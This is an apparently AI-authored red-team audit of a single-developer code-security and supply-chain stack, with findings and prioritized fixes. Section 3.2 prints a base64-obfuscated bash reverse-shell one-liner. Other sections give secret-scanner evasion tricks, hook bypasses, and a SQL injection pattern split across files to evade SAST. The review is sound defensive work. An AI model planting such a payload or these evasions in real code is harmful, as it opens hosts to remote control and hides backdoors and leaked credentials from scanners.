# Red Team Report — Agent 1: The Attacker
**Perspective:** External attacker and malicious insider bypass analysis

**Target:** Code Security & Supply Chain Stack as described in `development-security-stack-option-1.md`

**Date:** 2026-02-20

---

## Executive Summary

This security stack provides meaningful layered defense for a single-developer AWS practice. However, several architectural decisions — the deliberate gap between commit and PR scanning, the intra-file-only SAST engine, the self-hosted infrastructure without hardening guidance, and the absence of runtime application security — create exploitable windows. An attacker who understands the stack's design can craft payloads that traverse every layer undetected.

---

## 1. Bypass Opportunities

### 1.1 The Pre-commit to PR Gate Window

**Finding:** SAST (Semgrep CE) and IaC scanning (Checkov) are intentionally excluded from pre-commit and only run at the PR gate. The document states: *"Developers working in feature or development branches push freely — no security scans block their commit or push workflow."*

**Attack:** A malicious insider pushes vulnerable or backdoored code to a feature branch and shares it with collaborators (e.g., "test this branch on staging") before a PR is ever opened. The code executes in development/staging environments with zero security scanning having occurred. If the environment has access to production secrets, databases, or AWS credentials, the damage is done before the PR gate fires.

**Severity:** High. The architecture assumes code only matters once it enters a protected branch. In practice, feature branches are deployed to shared environments constantly.

### 1.2 Pre-commit Hooks Are Client-Side and Optional

**Finding:** The entire pre-commit framework runs on the developer workstation. There is no server-side enforcement.

**Attack:** An attacker (or compromised developer machine) simply runs:
```bash
git commit --no-verify
git push --no-verify
```
This bypasses all Tier 1 linting and Tier 2 Gitleaks secrets scanning. The secrets gate — the one security control in pre-commit — is trivially defeated. The CI/CD Gitleaks job catches this on PR, but only if a PR is opened before the secret is exploited.

**Severity:** High. The document acknowledges Gitleaks in pre-commit is critical because *"a credential pushed to any branch is a potential exposure from the moment it touches a remote."* Yet the enforcement is client-side only.

### 1.3 `continue-on-error: true` in the GitHub Actions Workflow

**Finding:** Every scanner step in the GitHub Actions workflow uses `continue-on-error: true`:
```yaml
- run: semgrep scan --config auto --json --output semgrep-results.json .
  continue-on-error: true
```
The Checkov action, Grype, and Gitleaks all have the same pattern.

**Attack:** Security scan failures do not block the PR from merging. A PR with critical SAST findings, exposed secrets, or high-severity CVEs will show a green check on the workflow. The document notes branch protection is only *"(Optional) Branch protection rule configured to require the workflow to pass before merge"* — and even if enabled, all jobs pass because errors are swallowed.

**Severity:** Critical. This effectively makes the entire CI/CD security gate advisory-only. An attacker merging a PR just needs to wait for reviewer approval, since the security jobs will never fail the build.

### 1.4 Container Scanning Only Runs on Push to Main

**Finding:** The Trivy container scan job has a conditional:
```yaml
container:
  name: Container — Trivy
  runs-on: ubuntu-latest
  if: github.event_name == 'push'
```

**Attack:** Container image vulnerabilities are never scanned during the PR process. A Dockerfile that pulls a known-vulnerable base image (e.g., an old Alpine with a critical CVE) will pass the PR gate with no container scan. The container scan only fires after the code is already merged to main.

**Severity:** High. The PR gate — described as *"the primary security gate"* — has a blind spot for the entire container vulnerability class.

### 1.5 Direct Pushes to Main Bypass PR Gate

**Finding:** The workflow triggers on `push: branches: [main]` as a "safety net for non-PR merges." But the document does not mandate branch protection rules that require PRs.

**Attack:** If branch protection is not configured (the document only mentions it as optional), anyone with write access can `git push origin main` directly. The push triggers the same advisory-only scans (with `continue-on-error: true`), so even the safety net is non-blocking.

**Severity:** High.

---

## 2. Supply Chain Attack Vectors

### 2.1 Nexus Proxy Cache Poisoning via Upstream Compromise

**Finding:** Nexus is configured as a transparent proxy with aggressive caching:
```json
"proxy": {"remoteUrl": "https://registry.npmjs.org", "contentMaxAge": -1, "metadataMaxAge": 1440}
```
`contentMaxAge: -1` means cached content never expires. `metadataMaxAge: 1440` means metadata is refreshed every 24 hours.

**Attack:** If an upstream package is compromised (as in the `event-stream`, `ua-parser-js`, or `colors.js` attacks), Nexus will cache the malicious version and serve it indefinitely. Worse: once cached, even if the upstream registry removes or yanks the package, Nexus continues serving the poisoned version. The 24-hour metadata refresh window means a newly published malicious version has up to 24 hours before Nexus even checks for updates.

**Severity:** High. The document states Nexus provides *"Controls what enters your supply chain"* but the reference configuration has no content validation, no allowlisting, and no integrity verification beyond what the upstream registry provides.

### 2.2 No Dependency Pinning Enforcement

**Finding:** The stack scans for known CVEs in dependencies (Grype, Trivy, npm audit) but does not enforce dependency pinning or lockfile integrity.

**Attack:** A `package.json` with `"lodash": "^4.17.0"` will resolve to whatever the latest 4.x version is at install time. An attacker who publishes a malicious 4.x patch version gets automatic adoption. The existing tools only flag known CVEs — a zero-day backdoor in a new patch version would not appear in any vulnerability database and would pass all SCA scanners.

**Severity:** Medium-High. The gap is structural: SCA tools are reactive (they check against known vulnerability databases). A novel supply chain attack has no CVE entry and is invisible to Grype, Trivy, and npm audit.

### 2.3 No Package Signature Verification

**Finding:** Neither Nexus CE configuration nor the package manager configurations shown in the document enable package signature verification. The npm `.npmrc` points to `http://localhost:8081/repository/npm-proxy/` (note: HTTP, not HTTPS). The pip config explicitly sets `trusted-host = localhost`.

**Attack:** MITM between Nexus and the upstream registry (or between the developer workstation and Nexus) can substitute packages. The `trusted-host` pip directive disables certificate verification entirely. For npm, packages are served over plaintext HTTP.

**Severity:** High for the reference configurations as written. In a real deployment on a K8s cluster with internal networking this is partially mitigated, but the document's example configurations normalize insecure patterns.

### 2.4 Typosquatting and Dependency Confusion

**Finding:** The Nexus configuration uses separate proxy repositories for each ecosystem but does not describe namespace isolation, internal package naming conventions, or dependency confusion protections.

**Attack:** An attacker publishes a public npm package with the same name as an internal package. If Nexus group repositories are configured to check the proxy (public) repository before the hosted (private) repository, the attacker's public package takes precedence. This is the classic dependency confusion attack. npm, PyPI, and Go are all vulnerable to this pattern.

**Severity:** High. The document does not address repository ordering in group repositories or scoping (`@org/package-name` for npm, namespace for PyPI).

### 2.5 No SBOM Attestation or Verification at Deploy Time

**Finding:** Syft generates SBOMs and Grype scans them, but there is no attestation step. SBOMs are generated as CI artifacts but are not cryptographically signed or verified at deployment time.

**Attack:** An attacker who can modify the CI artifact (e.g., by compromising the GitHub Actions runner or artifact storage) can replace the SBOM with a clean version while the actual deployed image contains different dependencies. There is no attestation chain from build to deploy.

**Severity:** Medium. This is a gap in supply chain integrity verification rather than a direct exploit, but it means the SBOM is a reporting tool rather than a security control.

---

## 3. Tool Evasion Techniques

### 3.1 Semgrep CE: Intra-File Only Analysis

**Finding:** The document explicitly states: *"No cross-file/inter-file dataflow analysis (CE is intra-file only)."*

**Attack:** Split a vulnerability across two files. For example:
```python
# file_a.py
def get_query(user_input):
    return f"SELECT * FROM users WHERE name = '{user_input}'"

# file_b.py
from file_a import get_query
import sqlite3
conn = sqlite3.connect("db.sqlite")
conn.execute(get_query(request.args["name"]))
```
Semgrep CE sees `file_a.py` as a function that builds a string. It sees `file_b.py` as a function that calls `conn.execute()` with a function return value. Neither file in isolation triggers a SQL injection rule because the taint source (`request.args`) and the sink (`conn.execute`) are in different files and the taint propagation crosses the file boundary.

**Severity:** High. Cross-file dataflow vulnerabilities are the most dangerous class (injection, SSRF, path traversal via imported helpers) and are structurally invisible to Semgrep CE.

### 3.2 Semgrep CE: No Bash Depth

**Finding:** The document notes Semgrep CE has only *"basic"* Bash support, which is why ShellCheck is included separately.

**Attack:** Embed malicious logic in shell scripts that Semgrep CE cannot analyze:
```bash
# Obfuscated reverse shell — ShellCheck checks syntax, not security semantics
eval "$(echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDMgMD4mMQ==' | base64 -d)"
```
ShellCheck will not flag this (it is syntactically valid Bash). Semgrep CE's basic Bash support will not trace through `eval` + `base64`. Gitleaks only looks for secrets patterns, not shell exploits.

**Severity:** High. There is no tool in the stack that performs security-focused analysis of shell script semantics beyond syntax checking.

### 3.3 Gitleaks: Regex-Based Evasion

**Finding:** Gitleaks uses regex patterns to detect secrets. The pre-commit hook runs `gitleaks protect --staged` (staged changes only).

**Attack techniques:**
- **Encoding:** Base64-encode credentials and decode at runtime. Gitleaks regex patterns match plaintext patterns like `AKIA[0-9A-Z]{16}` but not their base64 representations.
- **Splitting:** Store the key in two variables concatenated at runtime: `part1="AKIA" ; part2="IOSFODNN7EXAMPLE" ; key="${part1}${part2}"`. No single string matches the regex.
- **Environment variable indirection:** Store secrets in `.env` files added to `.gitignore`. Gitleaks only scans tracked files and staged changes.
- **Allowlist abuse:** Gitleaks supports `.gitleaksignore` for suppressing findings. A malicious insider adds their real credential to the ignore list.

**Severity:** Medium-High. Regex-based detection is fundamentally bypassable by anyone who knows the patterns. The document does not mention entropy-based detection or custom Gitleaks rules.

### 3.4 Trivy/Grype: Database Lag and Zero-Day Blindness

**Finding:** Both Trivy and Grype rely on vulnerability databases (NVD, GitHub Advisory Database, etc.) that are populated after CVEs are published.

**Attack:** Exploit a dependency vulnerability that has been disclosed but not yet assigned a CVE, or one that is being actively exploited in the wild before advisory publication (a "0.5-day"). The typical lag between disclosure and database entry ranges from hours to weeks. During that window, all SCA scans return clean.

**Severity:** Medium. This is inherent to database-driven SCA and cannot be fully mitigated, but the document does not acknowledge this limitation or describe compensating controls.

### 3.5 Checkov: Policy Bypass via Dynamic Values

**Finding:** Checkov performs static analysis of IaC files. It evaluates resource configurations as written in the template.

**Attack:** Use Terraform variables with no defaults, SSM parameter lookups, or CDK runtime context to defer security-critical values:
```hcl
resource "aws_s3_bucket_public_access_block" "example" {
  bucket                  = aws_s3_bucket.example.id
  block_public_acls       = var.block_public   # Checkov can't resolve this
  block_public_policy     = var.block_public
  ignore_public_acls      = var.block_public
  restrict_public_buckets = var.block_public
}
```
If `var.block_public` defaults to `true` in the module but is overridden to `false` at the root module or via `terraform.tfvars`, Checkov evaluates the default and passes the check. The actual deployed configuration is insecure.

**Severity:** Medium. Checkov can scan Terraform plan JSON output (which resolves all variables), but the document's usage examples only show directory-based scanning, not plan-based scanning.

---

## 4. Infrastructure Attack Surface

### 4.1 DefectDojo: High-Value Target with API Token Exposure

**Finding:** DefectDojo aggregates all security findings. The import script stores the API token in a shell variable:
```bash
DD_TOKEN="your-api-token"
```
The CI/CD workflow needs this token to import results. The document does not describe how this token is stored or rotated.

**Attack:** Compromise the DefectDojo API token (from CI logs, environment variables, or the import script itself). With the token, an attacker can:
- **Read all findings** — complete vulnerability inventory of every product.
- **Modify findings** — mark critical vulnerabilities as "False Positive" or "Risk Accepted" to hide them.
- **Delete findings** — remove evidence of compromise.
- **Import fake results** — upload clean scan reports to mask real vulnerabilities.

**Severity:** Critical. DefectDojo is the single pane of glass for all security findings. Its compromise undermines the entire stack's visibility.

### 4.2 Nexus: Default Credentials and Admin API Exposure

**Finding:** Nexus starts with an auto-generated admin password stored in a plaintext file:
```bash
kubectl exec -n nexus deploy/nexus-nexus-repository-manager -- cat /nexus-data/admin.password
```
The REST API examples use `NEXUS_AUTH="admin:your-password"` with basic authentication over HTTP.

**Attack:**
- The initial admin password is stored in the container filesystem. Any pod with access to the PVC or any user with `kubectl exec` access can read it.
- Nexus API credentials are passed in shell commands that may appear in shell history, CI logs, or process lists.
- Nexus is exposed on port 8081 via `kubectl port-forward`, but in a real deployment it would need a persistent ingress. The document does not describe TLS, network policies, or authentication hardening.
- **Nexus CE lacks fine-grained RBAC.** The Community Edition has limited role-based access control compared to Pro. A compromised admin account has full control over all repositories.

**Severity:** High. Nexus controls the entire supply chain. An attacker who compromises Nexus can inject malicious packages into every build.

### 4.3 SonarQube: Default `admin/admin` Credentials

**Finding:** The document notes:
```bash
# Default login: admin / admin — change immediately
```

**Attack:** If SonarQube is deployed and the default password is not changed (common in "I'll fix it later" scenarios), any network-adjacent attacker gets full admin access. SonarQube admin can modify quality gates (removing security checks), disable rules, or access source code analysis results.

**Severity:** Medium. The document does flag this, but provides no automated enforcement (e.g., Helm values that set a non-default password, or a startup script that forces password change).

### 4.4 Harbor: `harborAdminPassword` in Helm Values

**Finding:**
```bash
--set harborAdminPassword=your-secure-password
```

**Attack:** Helm values are stored in Kubernetes secrets and Helm release history. The password appears in:
- Shell history of whoever ran `helm install`
- Helm release secrets (base64-encoded, not encrypted) in the `harbor` namespace
- Any CI/CD pipeline that automates Harbor deployment

**Severity:** Medium.

### 4.5 No Network Policies Between Services

**Finding:** The document deploys DefectDojo, Nexus, SonarQube, Harbor, and Trivy Operator into separate namespaces but describes no Kubernetes NetworkPolicies.

**Attack:** By default, Kubernetes allows all pod-to-pod communication across namespaces. A compromised pod in any namespace can reach:
- DefectDojo API (read/write all findings)
- Nexus API (upload malicious packages)
- SonarQube API (read code analysis, disable rules)
- Harbor API (push malicious images)

A single compromised workload in the cluster has lateral access to every security service.

**Severity:** High.

### 4.6 Self-Hosted Services Are Themselves Attack Surface

**Finding:** The stack introduces four to five web applications (DefectDojo, Nexus, SonarQube, Harbor, plus their databases) running in the Kubernetes cluster.

**Attack:** Each service is a complex web application with its own vulnerability history:
- **DefectDojo** is a Django application. Django CVEs, Python dependency vulnerabilities, and DefectDojo-specific issues (e.g., past SSRF and XSS vulnerabilities) all apply.
- **Nexus 3** is a Java application running on Karaf/OSGi. It has had critical CVEs (e.g., CVE-2024-4956 path traversal, CVE-2020-36518 deserialization).
- **SonarQube** has had authentication bypass and code execution vulnerabilities.
- **Harbor** has had critical CVEs including CVE-2019-16097 (unauthenticated admin creation).

The document does not describe patching cadence, update automation, or vulnerability monitoring for the infrastructure services themselves. The Trivy Operator scans running images, but there is no described process for acting on findings in infrastructure components.

**Severity:** High. The security tools themselves become the weakest link if they are not patched. A single-developer practice is unlikely to maintain a rigorous patching schedule for four to five self-hosted services.

---

## 5. Gaps in Coverage

### 5.1 No Dynamic Application Security Testing (DAST)

**Finding:** The stack is entirely static analysis. There is no DAST tool (e.g., OWASP ZAP, Nuclei, Nikto) that tests running applications for vulnerabilities.

**Impact:** Entire classes of vulnerabilities are missed:
- Authentication and session management flaws
- Business logic vulnerabilities
- Runtime configuration issues (CORS, CSP, cookie flags, TLS configuration)
- Server-side request forgery (SSRF) that depends on runtime behavior
- Race conditions and time-of-check-time-of-use (TOCTOU) bugs

### 5.2 No Runtime Application Self-Protection (RASP) or WAF

**Finding:** No web application firewall or runtime protection is described.

**Impact:** Even if a vulnerability is deployed to production (which the advisory-only CI gate allows), there is no runtime layer to detect or block exploitation. No request-level logging, no anomaly detection, no automated blocking.

### 5.3 No Kubernetes RBAC Hardening

**Finding:** The document describes deploying services to namespaces but does not discuss:
- Pod Security Standards / Pod Security Admission
- Service account restrictions
- RBAC policies for who can `kubectl exec` into security service pods
- Restrictions on privileged containers

**Impact:** A compromised container can escalate privileges, access the Kubernetes API, read secrets from other namespaces, or escape to the node.

### 5.4 No Logging, Monitoring, or Alerting

**Finding:** There is no mention of:
- Centralized logging (e.g., Fluentd, Loki)
- Security event monitoring (e.g., Falco for runtime threat detection)
- Alerting on security scan failures or new critical findings
- Audit logging for who accessed DefectDojo, Nexus, or Harbor APIs

**Impact:** An attacker who compromises any component operates without detection. There is no mechanism to detect:
- Unauthorized API access to DefectDojo or Nexus
- Anomalous package downloads from Nexus
- Modified or deleted security findings
- Lateral movement between cluster services

### 5.5 No Incident Response Plan

**Finding:** The document describes detection but not response. There is no described process for:
- What happens when a critical vulnerability is found
- How to handle a compromised secret detected by Gitleaks (rotation, revocation)
- How to respond to a supply chain compromise via Nexus
- Rollback procedures for a compromised deployment

**Impact:** Finding vulnerabilities without a response process means findings accumulate in DefectDojo without remediation. The SLA tracking feature exists, but no SLA targets are defined.

### 5.6 No GitHub Actions Workflow Security

**Finding:** The GitHub Actions workflow uses third-party actions:
```yaml
- uses: actions/checkout@v4
- uses: bridgecrewio/checkov-action@v12
- uses: aquasecurity/trivy-action@master
- uses: github/codeql-action/upload-sarif@v3
```
The Trivy action pins to `@master` (a mutable branch tag), not a SHA.

**Impact:** A compromised upstream action can execute arbitrary code in the CI runner with access to:
- Repository source code
- GitHub token (can push code, create releases)
- Any secrets configured in the repository
- The DefectDojo API token used for importing results

Pinning to `@v4` or `@v12` is better than `@master` but still mutable. Only SHA-pinning provides immutability.

### 5.7 No Code Signing or Provenance

**Finding:** The stack does not describe:
- Commit signing (GPG or SSH)
- Image signing (Cosign/Notation are mentioned as a Harbor feature but not configured)
- SLSA provenance generation
- Deployment admission control that verifies signatures

**Impact:** There is no cryptographic chain of trust from developer to production. An attacker who gains write access to the repository or the container registry can inject unsigned code or images that deploy without verification.

### 5.8 No Protection for CI/CD Pipeline Itself

**Finding:** The GitHub Actions workflow is the primary security gate, but there is no description of:
- Required reviewers for changes to `.github/workflows/security.yml`
- CODEOWNERS protection for the workflow file
- Restrictions on who can modify branch protection rules
- Protection against a malicious PR that modifies the security workflow to skip checks

**Attack:** An attacker submits a PR that modifies `.github/workflows/security.yml` to add `if: false` to the security scan steps (or replaces the workflow entirely). If there is no CODEOWNERS or required review for workflow changes, this PR can be self-merged, permanently disabling all security scanning.

**Severity:** Critical.

---

## 6. Attack Scenario: End-to-End Compromise

Combining the above findings, here is a realistic attack chain:

1. **Initial access:** Compromise the developer workstation (phishing, malware, supply chain attack on a development tool).

2. **Bypass pre-commit:** Run `git commit --no-verify` and `git push --no-verify` to push a backdoor to a feature branch. No scanning occurs.

3. **Exploit the feature branch:** The backdoored code is deployed to a staging environment (common in development workflows). Extract staging credentials or pivot to production.

4. **Alternatively, go through the PR gate:** Submit a PR. The security scans run but all use `continue-on-error: true`, so the PR shows green checks regardless of findings. The backdoor uses cross-file dataflow (invisible to Semgrep CE intra-file analysis). The malicious dependency is too new for Grype/Trivy databases.

5. **Cover tracks:** Use the DefectDojo API token (extracted from CI environment) to mark any findings as "False Positive."

6. **Persist access:** Modify `.github/workflows/security.yml` in a subsequent PR to weaken scanning. Without CODEOWNERS protection, this change merges without special review.

---

## 7. Prioritized Recommendations

| Priority | Recommendation | Addresses |
|---|---|---|
| **P0** | Remove `continue-on-error: true` from security scan steps, or add a dedicated gate job that fails on findings | 1.3 |
| **P0** | Mandate branch protection: require PR, require security workflow pass, require CODEOWNERS approval for `.github/workflows/` | 1.5, 5.8 |
| **P0** | Store DefectDojo and Nexus API tokens as GitHub encrypted secrets, never in scripts | 4.1, 4.2 |
| **P1** | Pin all GitHub Actions to full SHA, not tags or branches | 5.6 |
| **P1** | Deploy Kubernetes NetworkPolicies isolating each service namespace | 4.5 |
| **P1** | Add container scanning to the PR gate (remove the `if: github.event_name == 'push'` condition) | 1.4 |
| **P1** | Enforce TLS for all internal service communication (Nexus, DefectDojo, SonarQube) | 4.2 |
| **P1** | Implement server-side pre-receive hooks or GitHub rulesets as enforcement for secrets scanning | 1.2 |
| **P2** | Add DAST scanning (OWASP ZAP or Nuclei) as a post-deploy pipeline stage | 5.1 |
| **P2** | Configure Nexus group repository ordering to prefer hosted (private) over proxy (public) for dependency confusion protection | 2.4 |
| **P2** | Implement Falco or equivalent for runtime threat detection | 5.4 |
| **P2** | Scan Terraform plan output (not just source files) with Checkov for variable-resolution bypass | 3.5 |
| **P3** | Add commit and image signing (GPG/SSH for commits, Cosign for images) | 5.7 |
| **P3** | Establish patching cadence for self-hosted services with automated vulnerability alerts | 4.6 |
| **P3** | Define and configure SLA targets in DefectDojo for each severity level | 5.5 |

---

*End of Red Team Report — Agent 1*
